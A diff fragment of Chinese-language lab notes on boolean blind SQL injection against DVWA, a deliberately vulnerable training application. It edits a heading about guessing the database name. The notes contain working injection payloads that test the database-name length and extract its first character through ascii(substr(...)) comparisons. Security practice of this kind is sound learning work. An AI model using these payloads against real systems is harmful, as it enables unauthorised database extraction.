@@ -7,7 +7,7 @@ DVWA-LOW-布尔盲注：
 1' and length(database())=4 -- 
 库名长度4为真
 
-3:猜库名用Ascii码
+3:猜库名用Ascii码和substr字段截取
 1' and ascii(substr((select database()),1,1))>=100 --  真
 1' and ascii(substr((select database()),1,1))>=110 --  假
 1' and ascii(substr((select database()),1,1))=100 --  真    判断库名第一个字母为"d"
